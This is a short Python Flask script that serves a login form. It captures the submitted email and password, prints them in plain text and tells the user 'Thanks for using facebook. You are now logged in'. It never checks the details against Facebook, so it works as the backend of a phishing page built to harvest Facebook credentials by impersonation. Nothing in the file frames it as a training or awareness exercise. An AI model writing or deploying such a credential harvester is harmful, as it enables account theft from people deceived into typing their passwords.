from flask import Flask, render_template, request

app = Flask(__name__)

@app.route("/", methods=["GET", "POST"])
def hello_world():
    if request.method == "POST": 
        name = request.form["email"]
        password = request.form["password"]
        print(f"The name is {name} and the password is {password}")
        # Save it to the database
        return "<b>Thanks for using facebook. You are now logged in</b>"
    return render_template("index.html")

app.run(debug=True)